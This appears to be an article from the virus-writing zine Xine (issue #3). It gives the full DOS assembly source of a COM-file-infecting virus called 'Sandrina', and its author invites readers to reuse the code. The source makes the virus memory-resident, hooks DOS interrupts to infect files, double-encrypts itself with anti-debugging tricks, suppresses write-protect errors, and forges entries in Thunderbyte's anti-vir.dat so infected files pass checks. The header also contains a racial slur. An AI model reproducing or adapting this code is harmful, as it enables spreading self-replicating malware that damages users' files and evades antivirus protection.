   ;                                        /-----------------------------\
   ;                                        | Xine - issue #3 - Phile 210 |
   ;                                        \-----------------------------/


   ;
   ;  Sandrina : She was really too sexy for me
   ; -ÄÄÄÄÄÄÄÄ-
   ;
   ; Author :      .UnknwoN MnemoniK
   ;
   ; Origin :  .Belgium
   ;
   ; Host :        .com non overwritter
   ;               .enun com included
   ;
   ; Per Process : .become TSR ( by dos 4A/48/49 )
   ;
   ; Hook/res :    .int 21h function 4Eh/54h
   ;       .int 24h handler! just for niggas who want spread it!
   ;
   ; Note :    .This virus is just an exemple virus to use san anti-vir.dat
   ;       hacka engine , you can use it , modify it , pick it all times
   ;       you want. I don't add poly or stealth things because I don't
   ;       find it interresting in this case , a quite simple com
   ;       non-overwritter
   ;
   ; Specificty:   .Double encrypted + Anti debugging : Int 01h as the decryptor
   ;               yes , Two days ago , I was looking 29A and I saw
   ;               the desassembling of a virus who use this technique
   ;               I decide to test it myself and when an Int 01h are
   ;               executed being traced, no decryption is produced and the code
   ;       crash. His two encryption loop give him a gewd anti-heuristic
   ;       protection
   ;
   ;               .Force Anti-vir.dat : I looked the bozo tutorial
   ;               and I decide also to code all this routine in one program
   ;               who originally just decrypt this anti-vir.dat , but now
   ;               it's modify all the file and rplace the value of the
   ;               infected as that place . He is quite gewd coding , you can
   ;       use it for yar virii if u want
   ;
   ;       .Intelligent Interrupt 24 handler , you ever used disk8 ?
   ;       Ok , so lets make a conversation about it , when u put an
   ;       Int24 handler and when the disk is writeprot , there's a dirty
   ;       sound isn't ? Yeah , you see , but now think if ya have like
   ;       each 4E/EF this sound 4 ou 5 times in one dir , this is
   ;       suspect , so now , the virus determine if it's a drive or a
   ;       disk , if it's a floppy , is the disk8 changed from the floppy
   ;       disk since last read ? if yes then put off the Write protected
   ;       internal flag , else then if the write proteced flag activate ,
   ;       skip the infection procedur , now there's a quite gewd
   ;       optimization , I have tested it , no problem , it's work fine!
   ;
   ;       Warning: a bug was reported , decryptor seems to detected by
   ;       TBAV and the C flag appears , but it comes only with the 2nd
   ;       3rd infection in the same directory , if you found it , don't
   ;       forget : starzero@hotmail.com
   ;


   .model tiny
   .code
   .286

   org 100h

   start:

   jmp start0              ; this jump will be reconstruct
                       ; at next generation
   start0:

   call virus              ; Now we call virus for tha delta off.

   virus:  pop bp                          ; delta offset ( if you don't
           sub bp,offset virus             ; understand that , press ctrl-alt-del
                       ; 3 time

   ;*****************************************************************************
   ; Part One
   ;
   ;  i11
   ;   11   Decryption zone
   ;  1111
   ;*****************************************************************************

   mov ax,3501h                            ; Get Int 01 adress
   int 21h                 ; ask dos , dos do it !
                       ; address will be back in es and bx
   push es                 ; save es:bx
   push bx

   sub ah,10h              ; now we have in ax = 2501h
   push ax                 ; save it on stack
   lea dx,[bp+encrypt_loop0]       ;put in dx offset decrypt loop + delta
   int 21h                 ; move the int 01 handler here !

   lea si,[bp+encrypt_begin]       ; si = start decryption offset
   mov cx,encrypt_end-encrypt_begin

   int 01h                                 ; now decrypt it , when it's traced
                       ; the prog crash !
   jmp encrypt_begin           ; jump

   encrypt_loop0:                          ; but in reality , there is it

           db 80h,34h                      ; alias xor byte ptr [di],xx
   key1:   db 00
           inc si              ; increment si
       loop encrypt_Loop0      ; make the boucle untill cx=0

   iret

   encrypt_begin:                          ; secondary encryption

   pop ax                  ; ax = 2501h
   pop dx                  ; dx = int 01 old offset
   pop ds                  ; ds = int 01 old seg
   int 21h                 ; restore old int 1 seg:off

   push cs cs
   pop es ds

   lea si,[bp+encrypt_begin1]          ; second encrypt loop
   mov cx,encrypt_end-encrypt_begin1

   encrypt_loop2:

           mov al,0adh                             ; anti debugging trick
           mov dx,64h                              ; I remove stack trick
           out dx,al                               ; because it allways crash

           db 80h,04h                              ; alias add byte ptr [si],xx
   key2:   db 00

       mov al,0aeh
       mov dx,64h
       out dx,al

       inc si

   loop encrypt_loop2              ; do the loop

   ;*****************************************************************************
   ; Part 2 : Put the virus in memory
   ;
   ; ýýý22
   ; x22',  2ø) Put in memory the virus
   ; 22222
   ;*****************************************************************************

   encrypt_begin1:

   MOV di,100h                             ; push 100h
   push di                                 ; return at 100h next boot
   LEA si,[bp+save]            ;
   movsw                   ; retore original bytes
   movsb

   mov ax,5469h                            ; sexy sandrina ;)
   int 21h

   cmp ax,0666h                            ; test if we are already in memory
   je return

   mov ax,3521h                            ; save 21h adress
   int 21h

   mov word ptr cs:[bp+Old21S],es      ; save here the Int 21 seg
   mov word ptr cs:[bp+Old21O],bx      ; "    "    "   "   "  off

   push cs                 ; es = cs
   pop es

   mov ah,4ah                              ; modify memory size
   push ax
   mov bx,0FFFFh               ; get max memory
   int 21h                 ; it must return with error and
                       ; how memory is free

   sub bx,((real_end-start0)+100h)+1       ; reduce it

   pop ax                  ; modify mem size
   int 21h                 ;
   jc return                               ; if error ? Don't put the virus

   mov ah,48h                              ; allocate memory
   mov bx,((real_end-start0)+100h)     ; all we need !
   int 21h

   push ax                 ; dec ax ( new seg )
   dec ax                  ; to mark and hide this seg to dos
   mov es,ax

   mov byte ptr es:[0],'Z'                 ; mask it for dos
   mov word ptr es:[1],08

   pop es                  ; es = new seg

   xor di,di
   push di
   pop si
   mov cx,100h
   push cx
   repz movsb                              ; put the psp

   push cs                 ; ds <- cs
   pop ds

   lea si,[bp+start]
   pop di
   mov cx,real_end-start0
   repz movsb                              ; put the code

   push ds es              ; ds <- es
   pop ds

   mov     ax,2521h
   mov     dx,offset NewInt_21         ; DS:DX = Int_21_Handler
   int     21h                             ; Set the new handler

   pop ds                  ; ds <- cs


   return: push    cs          ; cs = es = ds
       push    cs
       pop es
       pop ds
       mov     ah,1ah          ; restore the dta
       mov dx,80h          ;
       int 21h         ; ask dos , dos do it !

   ; we return here to the host here , look , only a stupid ret!

           ret                             ; remember , push di ( di = 100h )

   ;**************************************************************************
   ; Part Three
   ;
   ; 33333
   ;  -333  3ø) The Interrupt controller
   ; 33333
   ;***************************************************************************

   fake_24:        mov al,3
               mov byte ptr cs:[iswriteprot],1
               iret

   Old24O:         dw 0
   Old24S:         dw 0

   NewInt_21:              pushf           ; save the flag

                           cmp ah,4eh      ; intercept FindFirst
                           je Handler21
                           cmp ax,5469h    ; Verify flag infos ( everybody don't
                           je check_return ; care about it )

                           popf            ; restore it

   JmpTO:                  db 0eah         ; jump to the real Int 21h
   Old21O:         dw 0
   Old21S:         dw 0

   Do_Int21:               pushf           ; here we make an Int 21h
               push cs
               call JmpTO
               ret

   check_return:           mov ax,0666h    ; return with our verification code
               popf
               iret

   Handler21:

   pusha                                   ; save register + seg
   push es
   push ds

   mov ah,2Fh                              ; save the current dta
   int 21h

   push es
   push bx

   push cs                                 ; and set ES = DS = CS
   push cs
   pop ds
   pop es

   mov ah,1ah                              ; fix our dta
   lea dx,[dta]
   int 21h

   call check_conditions                   ; if we have enough memory for
   jc fin0                                 ; modifing anti-vir.dat ?
   mov word ptr [temporary_seg],ax         ; if yes , save the temporary seg

   mov ax,3524h                ; now we hide error handle for user
   int 21h                 ; get adress
   mov word ptr cs:[Old24S],es     ; and stock it here!
   mov word ptr cs:[Old24O],bx

   mov ax,2524h                ; and now we fix it at our handle
   mov dx,offset fake_24           ; everyting is kewl , no more
   int 21h                 ; user aler

   mov ah,19h              ; get current drive from dos
   int 21h

   cmp al,1                ; is it <> a or b then put iswriteprot
   ja changethings             ; off

   mov ah,16h              ; if a disk8 drive then set if
   mov dl,0                ; disk are changed since last times
   int 13h                 ; if so , put iswriteprot off

   cmp ah,6                ; is ah = 6 ?
   jne don_tchange             ; no then don't change anything

   changethings:

   mov byte ptr [iswriteprot],0        ; put off siwriteprot

   don_tchange:
   cmp byte ptr [iswriteprot],1        ; if iswriteprot on then skip
   je end_of_find              ; infection procedure

   mov ah,4eh                              ; Find first (Com)
   mov cx,2
   lea dx,[com]

   next:
   Call Do_int21                           ; equal Int 21

   jc end_of_Find                          ; FF/FN
   call infect

   cmp byte ptr [iswriteprot],1        ; is disk protected ?
   je end_of_Find              ; nah , so continue infections

   next0: mov ah,4fh
   jmp next

   end_of_Find:

   mov dx,word ptr cs:[Old24O]     ; restore old Int 24 Seg:Off
   mov ax,word ptr cs:[Old24S]     ; take a look on it !
   push ax
   pop ds
   mov ax,2524h                ; restore it
   int 21h                 ; ask dos , dos do it!

   push cs
   pop ds

           call    Uncheck         ; De-allocate memory

   fin0:           mov     ah,1Ah          ; Fix Dta
           pop dx
           pop     ds
           int     21h
                   pop     ds              ; restore seg+reg
           pop es
           popa
                   popf
                   jmp     JmpTo           ; return to int 21

   go:                                     ; Lseek ( hehehehe )

   mov ah,42h
   xor cx,cx
   xor dx,dx
   int 21h

   inf_ret0:       ret

   ;********************************************** Add yar infection proc here !
   ; Part Four
   ;
   ; 44 4
   ; 4444  4ø) Com infection
   ;    4
   ;****************************************************************************


   infect:

   mov ah,byte ptr [dta+22]                ; infect only if sec <> 02
   and ah,00001111b
   xor ah,00000001b
   je inf_ret0

   mov ax,4301h                            ; destroy attribute
   xor cx,cx
   lea dx,[dta+30]
   push dx
   int 21h

   mov ax,3d02h                            ; open in r/w
   int 21h
   xchg ax,bx

   mov ah,3fh                              ; save 3 first byte
   mov cx,3
   lea dx,[save]
   int 21h

   mov bp,2                                ; only for anti-vir if infection Ok

   push word ptr [dta+24]
   cmp byte ptr [save],'M'                 ; check if exe
   je close
   cmp byte ptr [save],'Z'                 ; check if exe
   je close

   mov al,0
   call go

   mov byte ptr [dta+25],0E9h              ; make the jump
   sub byte ptr [dta+26],3

   mov ah,40h                              ; write it
   mov cx,3
   lea dx,[dta+25]
   int 21h

   mov al,2
   call go                                 ; go to the end

   sub ax,7
   mov cx,dx
   mov dx,ax
   mov ax,4200h                            ; go to the end -7
   int 21h

   mov ah,3fh                              ; read 7 last bytes of the files
   mov cx,7
   lea dx,[buffer7]
   int 21h

   add word ptr [buffer7+5],fin-start0     ; add the size of the file

   call encrypt_and_write                  ; write the virus encrypted

   dec bp                                  ; bp = 1 ( dec bp , flag Z = 1
                                           ; infection OK -> Modify Anti-vir.dat
   close:

   mov ax,5701h                            ; fix sec = 02
   mov cx,word ptr [dta+22]
   and cl,11110000b
   inc cl
   pop dx
   int 21h

   mov ah,3eh                              ; close the file
   int 21h

   pop dx
   mov ax,4301h                            ; restore attribute
   mov cx,word ptr [dta+21]
   int 21h

   dec bp
   jnz Closing_star            ; if no infection don't change anti-v.

   call antivmodif                         ; update anti-vir.dat

   Closing_star:
   ret                 ; return to tha caller

   encrypt_and_write:

   push cs                 ; save cs cs
   push cs

   mov es,word ptr [temporary_seg]         ; copy in temporary_seg the virus
   xor di,di
   mov si,100h
   mov cx,fin-start0+3
   repz movsb

   mov ah,byte ptr [dta+26]                ; encrypt encrypt_end-encrypt_begin1
   mov byte ptr es:[key2-100h],ah
   lea si,[encrypt_begin1-100h]
   mov cx,encrypt_end-encrypt_begin1

   enc_loop0:
   sub byte ptr es:[si],ah
   inc si
   loop enc_loop0              ; do the encryption!

   mov ah,byte ptr [dta+27]                ; encrypt encrypt_end-encrypt_begin
   mov byte ptr es:[key1-100h],ah
   lea si,[encrypt_begin-100h]
   mov cx,encrypt_end-encrypt_begin

   enc_loop1:
   xor byte ptr es:[si],ah
   inc si
   loop enc_loop1              ; do the encryption!

   mov ah,40h                              ; write the encrypted virus
   mov cx,fin-start0           ; put in cx size
   push es
   pop ds
   lea dx,[start0-100h]            ; hehe , we are in meeemory !
   int 21h                 ; !DO IT! Here we gooo!

   pop ds
   pop es

   ret

   ;*****************************************************************************
   ; Part five
   ;
   ; 5555
   ;  5555 5ø) Check if condition aivable for modifing Anti-vir.dat
   ; 55555
   ;*****************************************************************************

   Check_conditions:

   mov ah,48h                                      ; can we allocate a seg ?
   mov bx,65000/16                 ; return with C or not C
   int 21h
   ret

   Uncheck:

   mov es,word ptr [temporary_seg]                 ; delocate the seg who was
   mov ah,49h                                      ; allocate upper
   int 21h
   AM_ret: ret

   ;****************************************************************************
   ; Here's the C flag totally out , so , I'm the first to fuck Thunderbyte too
   ; deep !
   ;
   ; 66'
   ; 6666 6ø) Modifing Anti-vir.dat
   ; 6666
   ;*****************************************************************************

   AntivModif:

   mov ax,4300h                                    ; check if anti-vir.dat
   lea dx,[antiv]                                  ; really exist
   int 21h
   jc AM_ret

   mov ax,3D00h                                    ; open anti-vir.dat
   mov dx,offset antiv
   int 21h
   xchg ax,bx

   mov word ptr [ncounter],0           ; counters are important , they
   mov word ptr [counter],0            ; serve in good part locations

   mov ax,4202h                                    ; go on the end
   push ax
   xor cx,cx
   push cx cx cx                   ; push 3 times 00
   pop dx
   int 21h

   sub ax,80h                                      ; sub entry of high size

   loopingzero:
   sub ax,40h                                      ; couting
   inc byte ptr [ncounter]                         ; the number of sections
                                                   ; to scan
   cmp ax,0
   jnz loopingzero

   pop dx cx
   pop ax
   sub al,2                                        ; go on the first
   int 21h

   mov ah,3fh                                      ;read 128 first bytes and store
   mov cx,80h+40h                                  ; it into Build0
   mov dx,offset build0                            ;
   int 21h

   testfile:                                       ; I was drunk that day...

   mov cx,12
   lea si,[buildtable]             ; get buildtable
   lea di,[dta+30]                 ; here we test the name
   loop0:                                          ; here I test if the name of
   mov al,byte ptr [si]                            ; the file is the good one
   cmp byte ptr [si],0                             ; in the good section
   je thatsOK
   cmp byte ptr [di],al
   jnz notOk
   inc si
   inc di
   loop loop0                  ; check every part

   notOk: inc byte ptr [counter]                   ; if all section scanned ?
   mov ah,byte ptr [ncounter]
   cmp byte ptr [counter],ah
   je nohere                                       ; yes ? ok , bye....
   mov ah,3Fh
   mov cx,40h
   mov dx,offset buildtable                        ; read next section
   int 21h
   jmp testfile

   nohere: mov ah,3eh                              ; if not in the list , so
   int 21h                                         ; close anti-vir.dat
   ret                                             ; tchao bella...

   thatsOk:

   mov ax,word ptr ds:[build0+56h]                 ; get the decryptor key
   mov word ptr ds:[key],ax

   lea si,[buildtable+0ch]                         ; mov si the start of the
                                                   ; section
   mov dx,1ah                                      ; read bozo tutorial
   mov cx,word ptr key
   xor cx,word ptr ds:[si-0ch]

   decryptloop:                    ; decrypt the zone

   mov ch,cl                   ; mathematical functions
   dec cx                      ; I can't explain it anymore
   and cl,0fh                  ; Wich this way of encryption
   mov ax,word ptr ds:[si]             ; antivir.dat struct appears
   xor ax,cx                   ; totally out !
   rol ax,cl
   sub ax,cx
   xor ax,word ptr key

   mov word ptr ds:[si],ax
   inc si
   inc si
   dec dx
   jnz decryptloop                                 ; loop here

   mov ah,3eh                                      ; close the file
   int 21h

   mov ax,3d00h                                    ; open the file in the buildt.
   lea dx,[buildtable]
   int 21h
   xchg ax,bx                  ; open physically the file

   mov ah,3fh                                     ; read 20h first bytes
   mov cx,20h
   lea dx,[buildtable+0eh]
   int 21h

   mov al,2                                        ; go at the end
   call go
                                                   ; now ax = real size of the
                                                   ; file without modification
                                                   ; of the dta
   mov word ptr [buildtable+0ch],ax                ; and save it here

   xor ax,ax
   call go                                         ; go on the entry of the file

   lea si,[start0]                                 ; fix the first bytes of
   lea di,[buildtable+30h]                         ; the entry-point
   push cs                                         ; in buildtable
   pop es
   movsw
   movsw
   movsw

   push ds
   push ax dx

   mov ah,3fh                                      ; yeah , now , put
   mov cx,word ptr [buildtable+0ch]                ; all the file in mem
   mov ds,word ptr [temporary_seg]
   xor dx,dx
   int 21h

   pop dx ax                                       ;
   call calculation                                ; and render checksums
   pop ds

   finstore:

   mov word ptr [buildtable+2Eh],dx                ; save checksums
   mov word ptr [buildtable+38h],ax

   lea si,[buildtable]                             ; rendering the Validation
                                                   ; key
   xor ax,ax
   mov cx,03eh

   pkt_loop:   add ax,ax
           add al,byte ptr ds:[si]
           inc si
   do_the_xor: xor ax,0a097h
           js do_the_xor
           loop pkt_loop

   mov word ptr [buildtable+3eh],ax                ; put the Validation key

   encrypt:

   lea si,[buildtable+0ch]                         ; all is Ok , encrypt the
                                                   ; section now !
   mov dx,1ah
   mov cx,word ptr [key]
   xor cx,word ptr ds:[si-0ch]

   encrypt_loop:   mov ch,cl
           dec cx
           and cl,0fh
           mov ax,word ptr ds:[si]
           xor ax,word ptr [key]
           add ax,cx
           ror ax,cl
           xor ax,cx
           mov word ptr ds:[si],ax
           inc si
           inc si
           dec dx
           jnz encrypt_loop        ; invert than above

   mov ax,3d02h                            ; Open anti-vir.dat
   mov cx,010b
   mov dx,offset antiv
   int 21h
   xchg ax,bx

   mov ax,40h                              ; render position of the section
   xor cx,cx
   mov cl,byte ptr [counter]       ; get number of the section
   mul cx                  ; and multiply it by 40
   add ax,80h              ; add 80h (128 first bytes)
   xchg ax,dx              ; we have the right offset now!
   xor cx,cx
   add ax,40h
   mov ax,4200h                            ; go in it
   int 21h

   mov ah,40h                              ; write it
   mov cx,40h
   mov dx,offset buildtable        ; go at buildtable offset
   int 21h

   mov ah,3eh                              ; close
   int 21h
   ret                                     ; return with all is Ok

   calculation:                ; render checksum

   push bx                 ; this is an important part
   mov cx,word ptr [buildtable+0ch]    ; if u wanna understand
                       ; go at Bozo tutorial
   mov di,cx
   shr di,1
   xor ax,ax
   xor dx,dx

   startit: test ah,80h
       jz krad1
       xor ax,0A097h

   krad1:  test dh,80h
       jz krad2
       xor dx,0a097h

   krad2:  mov bx,ax
       add bx,ax
       mov cx,dx
       add cx,dx
       lodsw
       mov dl,ah
       add ax,bx
       mov ah,bh
       add dx,cx
       mov dh,ch
       dec di
       jnz startit
       pop bx
       ret

   com:        db '*.com',0                ; infos
   save:           int 20h
                   db 0
   antiv:      db 'anti-vir.dat',0
   encrypt_end:
   buffer7:    db 7 dup (0)
   fin:
   key:        dw ?
   counter:        dw ?
   ncounter:       dw ?
   iswriteprot:    dw ?
   temporary_seg:  dw ?
   dta:        db 42h dup (?)
   build0:     db 80h dup (?)
   buildtable:     db 192-80h-13 dup (?)
   real_end:
   end start
